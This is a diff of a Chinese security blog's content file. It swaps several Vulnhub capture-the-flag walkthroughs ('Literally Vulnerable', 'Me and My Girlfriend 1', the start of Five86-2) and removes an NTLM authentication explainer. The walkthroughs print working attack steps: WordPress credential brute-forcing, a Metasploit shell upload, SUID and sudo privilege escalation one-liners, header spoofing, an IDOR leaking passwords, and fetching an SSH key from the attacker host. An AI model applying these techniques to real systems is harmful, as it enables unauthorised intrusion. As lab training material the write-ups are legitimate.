-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"172.16.252.131    literally.vulnerable"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-14-54-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-54-43屏幕截图"></p>
-<p>先扫描 65535 端口，逐一访问，得到 <code>phpcms</code> 页面，访问需要密码，<code>wpsacn</code> 枚举</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u <span class="string">"http://172.16.252.131:65535"</span> -e php --random-agents -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-15-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-15-13-12屏幕截图"> </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ --enumerate</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] maybeadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] notadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
-
-<p>得到两个用户名，使用前面得到的几个密码枚举爆破，碰运气，得到一组用户名密码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ -U users.txt -P backupPasswords</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line">| Username: maybeadmin, Password:<span class="variable">$EPid</span>%J2L9LufO5</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-16-25-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-25-38屏幕截图"></p>
-<h3 id="登录-Wordpress-后台"><a href="#登录-Wordpress-后台" class="headerlink" title="登录 Wordpress 后台"></a>登录 Wordpress 后台</h3><p>都翻了一遍，得到一组用户名和密码：</p>
-<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">notadmin:Pa<span class="symbol">$</span><span class="symbol">$</span>w0rd13!&amp;</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-16-41-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-41-43屏幕截图"> </p>
-<h2 id="登录系统-Getshell"><a href="#登录系统-Getshell" class="headerlink" title="登录系统(Getshell)"></a>登录系统(Getshell)</h2><p>利用 <code>MSF</code> 上传木马 getshell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/unix/webapp/wp_admin_shell_upload</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-18-18-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-18-18-23屏幕截图"></p>
-<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : literallyvulnerable</span><br><span class="line">OS : Linux literallyvulnerable 4.15.0-88-generic <span class="comment">#88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">######## lsb_release #############</span></span><br><span class="line">www-data@literallyvulnerable:$ lsb_release -a lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description: Ubuntu 18.04.3 LTS</span><br><span class="line">Release: 18.04</span><br><span class="line">Codename: bionic</span><br><span class="line"></span><br><span class="line"><span class="comment">####### /etc/passwd #######</span></span><br><span class="line">doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash </span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>寻找 SUID 程序，得到可疑文件：<code>itseasy</code> </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-19-27-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-27-43屏幕截图"> </p>
-<h2 id="权限提升-User"><a href="#权限提升-User" class="headerlink" title="权限提升(User)"></a>权限提升(User)</h2><p>运行 <code>itseasy</code> 得到当前目录绝对路径，看过一篇通过操控 <code>PATH</code> 参数值进行提权；怀疑程序调用了 <code>pwd</code> 命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">cp /bin/bash /tmp/<span class="built_in">pwd</span>    <span class="comment"># or echo "/bin/bash" &gt; /tmp/pwd</span></span><br><span class="line">chmod 777 /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
-
-<p>执行后，没有得到预期的结果</p>
-<p><code>objdump -d</code> 一下，看到个 <code>getenv</code> 函数，用来获取环境变量</p>
-<p>也就是可以通过改变环境变量的值来控制这个程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PWD=\$\(/bin/bash\)</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-20-28-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-28-54屏幕截图"> </p>
-<p><img src="2020-03-09-19-42-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-42-16屏幕截图"></p>
-<p>然后输入命令没有回显了，直接 SSH ：kali 下生成 ssh 公钥上传到目标机</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/john/.ssh &amp;&amp; wget http://172.16.252.129:8848/autorized_keys</span><br></pre></td></tr></table></figure>
-
-<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>HOME 目录下的到一个 base64加密的密码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am9objpZWlckczhZNDlJQiNaWko= </span><br><span class="line"><span class="built_in">echo</span><span class="string">"am9objpZWlckczhZNDlJQiNaWko="</span>| base64 -d </span><br><span class="line"></span><br><span class="line">john:YZW<span class="variable">$s8Y49IB</span><span class="comment">#ZZJ</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-19-54-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-54-52屏幕截图"> </p>
-<p><img src="2020-03-09-20-02-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-02-37屏幕截图"> </p>
-<p><img src="2020-03-09-20-05-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-05-51屏幕截图"></p>
-<p>搜索 SUID 程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find/ -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudopasswd root</span><br><span class="line">Sorry, user john is not allowed to execute <span class="string">'/usr/bin/passwd root'</span> as root on literallyvulnerable.</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries forjohn on literallyvulnerable:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/</span><br><span class="line">sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">    User john may run the following commands on literallyvulnerable: </span><br><span class="line">        (root) /var/www/html/test.html</span><br></pre></td></tr></table></figure>
-
-<p>可以运行 <code>/var/www/html/test.html</code> </p>
-<h2 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升(root)"></a>权限提升(root)</h2><p><code>/var/www/html</code> 目录下没有 <code>test.html</code> 文件，且 <code>john</code> 没有 <code>html</code> 目录的写权限，那就切换回 <code>www-data</code> 用户创建文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; test.html</span><br><span class="line">chmod 777 test.html</span><br></pre></td></tr></table></figure>
-
-<p><code>sudo</code> 运行，提权成功</p>
-<p><img src="2020-03-09-20-19-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-19-09屏幕截图"></p>
-<p><img src="2020-03-09-20-21-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-25屏幕截图"> </p>
-<p><img src="2020-03-09-20-21-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-43屏幕截图"> </p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -1807,147 +1418,150 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
-    <title>Windows认证体系—NTLM认证</title>
-    <url>/2019/08/23/Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94NTLM%E8%AE%A4%E8%AF%81/</url>
-    <content><![CDATA[<p>NTLM Hash与 NTLM的关系、NTLM网络认证流程</p>
-<a id="more"></a>
-
-<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><ul>
-<li><code>NTLM Hash</code> </li>
-<li><code>NTLM</code> </li>
-<li><code>LSASS</code> </li>
-<li><code>Net-NTLM hash</code> </li>
-</ul>
-<br>
-
-<p>关键词解释：</p>
-<ul>
-<li><code>NTLM Hash</code>：存储在<code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果</li>
-<li><code>Net-NTLM hash</code>：通常是指网络环境下 NTLM认证中的 Hash (下有说明)</li>
-<li><code>NTLM</code>：除 <code>Kerberos</code>之外的一种网络认证协议，只支持 Windows </li>
-<li><code>LSASS</code>：Windows系统的安全机制（系统进程）。用于本地安全和登陆策略 </li>
-</ul>
-<br>
-
-<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><br>
-
-<p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
-<blockquote>
-<p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code> </p>
-</blockquote>
-<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code>*，与  SAM数据库中的 *<code>NTLM Hash</code></em> 进行比较，从而实现认证</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
-
-<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比 SAM数据库中的 Hash进行验证</p>
-<br>
-
-<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><br>
-
-<blockquote>
-<p>Hash，<strong><em>一种将任意长度的消息压缩到某一固定长度的消息摘要的函数</em></strong> 。—— <a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin" target="_blank" rel="noopener">度娘百科</a>  </p>
-</blockquote>
-<p>通常意义上的 <code>NTLM Hash</code>指存储在 <code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于 <code>LSASS</code>进程中，便于 SSP（NTLM 安全支持提供程序）使用</p>
-<br>
-
-<h3 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h3><br>
-
-<ul>
-<li>用户密码：<code>susi2001</code></li>
-<li>首先，密码经过十六进制转为 <code>7375736932303031</code> </li>
-<li>将十六进制结果转为 Unicode格式 <code>73007500730069003200300030003100</code></li>
-<li>以 Hex（16进制）数据作 MD4加密 <code>ed3202726368f8e9fd23e78fbfac8c13</code> </li>
-</ul>
-<br>
-
-<blockquote>
-<p>MD4加密使用 <code>HashCalc</code> </p>
+    <title>Vulnhub靶机——Me and My Girlfirend1</title>
+    <url>/2020/03/03/Me-and-My-Girlfirend1/</url>
+    <content><![CDATA[<blockquote>
+<p>2020-02-10-22</p>
 </blockquote>
 <br>
 
-<h2 id="NTLM-和-NTLM-Hash"><a href="#NTLM-和-NTLM-Hash" class="headerlink" title="NTLM 和 NTLM Hash"></a>NTLM 和 NTLM Hash</h2><br>
-
-<p>NTLM 是一种网络认证协议，与 <code>NTLM Hash</code>的关系就是：<strong>NTLM网络认证协议是以 <code>NTLM Hash</code> 作为根本凭证进行认证的协议</strong></p>
-<br>
-
-<h2 id="NTLM网络认证机制"><a href="#NTLM网络认证机制" class="headerlink" title="NTLM网络认证机制"></a>NTLM网络认证机制</h2><br>
-
-<p>NTLM是一种基于质询/应答 （<em>Challenge/Response</em> ）消息交换模式的认证机制，常用于 <strong>工作组</strong>和<strong>域环境</strong>下<em>登录场景的身份认证</em></p>
-<br>
-
-<h3 id="NTLM-认证方式"><a href="#NTLM-认证方式" class="headerlink" title="NTLM 认证方式"></a>NTLM 认证方式</h3><br>
-
-<ul>
-<li><strong>交互式认证</strong> ：使用域账号登录到客户端；涉及两部分（客户端、域控）</li>
-<li><strong>非交互式认证</strong> ：在已经登陆 的客户端上使用 SSO 的方式访问一台服务器；涉及三部分（客户端、域控、服务器）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非交互式场景</span></span><br><span class="line"></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:domain\xiaoming </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:xiaoming</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your <span class="keyword">help</span> <span class="keyword">to</span> <span class="keyword">get</span> what Alice <span class="keyword">is</span> hiding <span class="keyword">and</span> <span class="keyword">get</span> <span class="keyword">full</span> <span class="keyword">access</span> <span class="keyword">to</span> the company!</span><br><span class="line"></span><br><span class="line">Difficulty <span class="keyword">Level</span>: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there <span class="keyword">are</span> <span class="number">2</span> flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br><span class="line"></span><br><span class="line"><span class="keyword">From</span> : https://www.vulnhub.com/entry/me-<span class="keyword">and</span>-my-girlfriend<span class="number">-1</span>,<span class="number">409</span>/</span><br></pre></td></tr></table></figure>
 
 <br>
 
-<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><br>
-
-<p>NTLM协议的认证过程有三步：</p>
-<ul>
-<li><strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li>
-<li><strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li>
-<li><strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li>
-</ul>
-<p>大致流程如下：</p>
-<ul>
-<li>使用用户名和密码尝试登录客户端</li>
-<li>客户端对密码进行哈希处理并缓存密码 hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
-<li>服务器生成一个 16字节的随机数，称为 <strong>质询</strong> (Challenge) 或随机数 (nonce.aspx)，并发送给客户端</li>
-<li>客户端使用缓存的 <strong><em>用户密码的 Hash</em></strong> 对此 <code>Challenge</code> 进行加密，加密结果为 <code>Response</code>（暂且叫做<code>Challenge1</code>），然后将结果发送给服务器</li>
-<li>服务器发送三项数据给域控制器：<ul>
-<li><code>User name</code></li>
-<li>发送给客户端的 <code>Challenge</code>（已加密） </li>
-<li>从客户端接收到的 <code>Response</code> </li>
-</ul>
-</li>
-<li>域控制器使用 <code>User name</code>从 AD中检索该用户密码的 <code>NTLM Hash</code>，并使用此 <code>NTLM Hash</code>来加密 <em><code>Challenge</code></em> ，然后把这个值和客户端计算的响应值（<code>Challenge1</code>）进行比较。如果它们相同，则验证成功</li>
-</ul>
-<blockquote>
-<p>经过 <code>NTLM Hash</code>加密 <code>Challenge</code>的结果在网络协议中称之为 <code>Net NTLM Hash</code> </p>
-</blockquote>
-<blockquote>
-<p>在以上流程中，用户的登录密码 Hash 即为 <code>NTLM Hash</code>，Response中则包含 <code>Net-NTLM Hash</code></p>
-</blockquote>
-<br>
-
-<h3 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h3><br>
-
-<blockquote>
-<p>NTLM version 2 (NTLMv2)是在 Windows NT 4.0 SP4中引入的（在 Windows 2000 中得到了本地支持），它通过加强协议来防止许多欺骗攻击，并增加服务器向客户机进行身份验证的能力，从而增强了 NTLM的安全性</p>
-</blockquote>
-<p><code>NTLM v1</code> 与 <code>NTLM v2</code> 最显著的区别就是 <code>Challenge</code> 与 <strong>加密算法</strong> 不同，共同点就是加密的原料都是 <code>NTLM Hash</code> ：</p>
-<ul>
-<li>Challenge：<ul>
-<li><code>v1</code>： 8-byte</li>
-<li><code>v2</code>：16-byte </li>
-</ul>
-</li>
-<li>Net NTLM Hash：<ul>
-<li><code>v1</code>：DES</li>
-<li><code>v2</code>： HMAC-MD5</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | <span class="number">5</span>-bytes<span class="number">-0</span></span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM v2</span></span><br><span class="line"></span><br><span class="line">SC = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">CC = <span class="number">8</span>-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">Kali：<span class="number">192.168</span><span class="number">.56</span><span class="number">.109</span></span><br><span class="line"></span><br><span class="line">目标网段：<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
 <br>
 
-<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
-<li><a href="http://wikipedia.moesalih.com/NTLM" target="_blank" rel="noopener">NT LAN Manager</a></li>
-<li><a href="http://www.voidcn.com/article/p-voxshmho-sn.html" target="_blank" rel="noopener">NTLM 协议</a></li>
-<li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li>
-</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
+
+<p>显示主机存活扫描：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="image-20200210204802372.png" alt="image-20200210204802372"> </p>
+<br>
+
+<p>排除本机与网关后，找出目标机，扫服务/端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>访问 <code>80</code> 端口的 Web页面。显示只有 <code>local</code> 地址才能访问，看源代码，作者给出提示：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>x-forwarded-for</code> ：用来识别通过 HTTP代理或负载均衡方式连接到 Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段（就是服务器用来识别客户端原始 IP 地址的）</p>
+<br>
+
+<p>改请求头，添加字段：<code>x-forwarded-for：localhost</code> ，返回页面信息（建议使用 Burp）</p>
+<br>
+
+<p><img src="2020-02-10-18-50-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="postman"> </p>
+<p><img src="2020-02-10-20-58-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<p><strong>NOTE</strong> ： 这里犯了一个错误，在查 <code>x-forwarded-for</code> 的时候，偶然看到了 <code>Postman</code> 也就是上图中的软件，下载、使用、测试浪费了许多时间，且最后越来越麻烦（提交表格、登录），最后便放弃了</p>
+<br>
+
+<p>不是说上图的软件不好用或难用，而是对其一点都不熟悉，不懂套路；<code>Burp</code> 使用不熟练 </p>
+<p>在 Burp 上有更方便的操作方式，后来改之</p>
+<br>
+
+<hr>
+<br>
+
+<p>通过改 <code>x-forwarded-for</code> 值，达到了欺骗服务器并返回数据，页面源代码并无有价值信息</p>
+<br>
+
+<p>既然是 Web 那便开始扫目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.111 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirb http://192.168.56.111</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.111</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-10-18-46-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-10-18-48-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+
+<p>得到地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/</span><br><span class="line">http://192.168.56.111/index.php/login/</span><br><span class="line">http://192.168.56.111/misc/</span><br><span class="line">http://192.168.56.111/robots.txt        <span class="comment">## /heyhoo.txt  </span></span><br><span class="line">http://192.168.56.111/server-status     <span class="comment">## 404</span></span><br><span class="line">http://192.168.56.111/heyhoo.txt        <span class="comment">### null</span></span><br></pre></td></tr></table></figure>
+
+<p>经访问，下面两个地址返回 <code>200 OK</code> 但却空白，一般是后续填充内容使用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/config.php   	<span class="comment"># 200 OK 返回空白</span></span><br><span class="line">http://192.168.56.111/misc/process.php      <span class="comment"># 200 OK 返回空白</span></span><br></pre></td></tr></table></figure>
+
+<p><code>robot.txt</code> 只有一个限制地址，访问并无又有用价值</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/heyhoo.txt</span><br><span class="line"></span><br><span class="line">http://192.168.56.111/heyhoo.txt	<span class="comment"># 无有用信息</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>最后的几个地址，需要通过修改 <code>x-forwarded-for</code> 值才能访问：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/index.php/login/?page=index	<span class="comment"># Index</span></span><br><span class="line"> </span><br><span class="line">?page=login     <span class="comment">### 登录页面</span></span><br><span class="line">?page=about     <span class="comment">#### 无有价值信息</span></span><br><span class="line">?page=register  <span class="comment">## 注册页面</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-10-21-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>注册后跳转登录，有三个选项， <code>Dahboard</code> 与 <code>Logout</code> 无甚作用，<code>Profile</code> 会显示你的账号信息</p>
+<p>看源代码，除密码为明文，无其他有价值信息。</p>
+<br>
+
+<p>其实，跳转到 <code>Profile</code> 页的时候，就已经注意到 URL 了：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/misc/process.php?page=profile&amp;user_id=14</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>sqlmap</code> 并没有跑出什么，到时在改变数字的时候，底下会出现其他用户的信息</p>
+<br>
+
+<p>从一开始，挨个访问，到 <code>5</code> 的时候，出现了用户名为：<code>alice</code> 的用户，也就是 <code>GirlFriend</code> </p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">Alice</span> <span class="string">Geulis</span></span><br><span class="line"><span class="attr">username:</span> <span class="string">alice</span></span><br><span class="line"><span class="attr">passwd:</span> <span class="string">4lic3</span></span><br></pre></td></tr></table></figure>
+
+<br>
+<br>
+
+
+<p><img src="2020-02-10-21-43-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-10-19-33-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p>登录 SSH 成功，访问目录得到隐藏文件和 FLAG1。然后就可以提权了</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Flag 1 :</span> <span class="string">gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+<p><img src="2020-02-10-19-48-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><br>
+
+<p>执行 <code>sudo -l</code> ，发现了可以使用 <code>php</code> ，执行以下命令，直接提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CMD=<span class="string">"/bin/sh"</span></span><br><span class="line">sudo php -r <span class="string">"system('<span class="variable">$CMD</span>');"</span></span><br></pre></td></tr></table></figure>
+
+<p>得到 FLAG2</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Thanks!</span> <span class="attr">Flag 2:</span> <span class="string">gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+<p><img src="2020-02-10-22-01-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-10-20-24-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-10-20-23-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
 ]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
       <tags>
-        <tag>Security</tag>
-        <tag>Windows</tag>
-        <tag>渗透测试</tag>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
       </tags>
   </entry>
   <entry>
@@ -2016,6 +1630,444 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       <tags>
         <tag>vulnhub</tag>
         <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Five86-2</title>
+    <url>/2020/03/19/Five86-2/</url>
+    <content><![CDATA[<blockquote>
+<p>2020-02-26</p>
+</blockquote>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<p>无 <code>ProFTPD 1.3.5e</code> 相关漏洞，无法匿名登录</p>
+<p>后台放置目录枚举，<code>WordPress</code> 站点 <code>wpscan</code> 扫描</p>
